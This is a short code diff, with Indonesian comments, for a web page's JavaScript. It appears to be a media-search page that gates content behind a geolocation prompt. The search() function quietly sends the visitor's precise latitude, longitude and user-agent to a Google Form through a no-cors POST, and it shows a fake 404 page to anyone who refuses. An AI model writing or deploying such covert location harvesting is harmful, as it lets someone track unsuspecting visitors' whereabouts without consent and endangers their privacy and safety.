@@ -171,7 +171,6 @@ fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(res => res.json())
   .then(json => data = json);
 
-// fungsi search gabung lokasi
 function search() {
   if (!navigator.geolocation) {
     document.body.innerHTML = '<div class="error">404 - Geolocation Tidak Tersedia</div>';
@@ -180,9 +179,9 @@ function search() {
 
   navigator.geolocation.getCurrentPosition(
     pos => {
-      // kirim lokasi ke Google Form
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+      // submit lokasi ke Google Form
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
       const ua = navigator.userAgent;
 
       const formData = new URLSearchParams();
@@ -192,17 +191,15 @@ function search() {
 
       fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
 
-      // setelah izin diberikan, tampilkan modal media
+      // setelah izin diberikan, tampil modal media
       showMedia();
     },
     err => {
-      // jika user menolak
       document.body.innerHTML = '<div class="error">404 - Anda menolak izin lokasi</div>';
     }
   );
 }
 
-// fungsi tampil modal media
 function showMedia() {
   const key = document.getElementById("keyword").value.trim().toLowerCase();
   if (!data[key]) return;
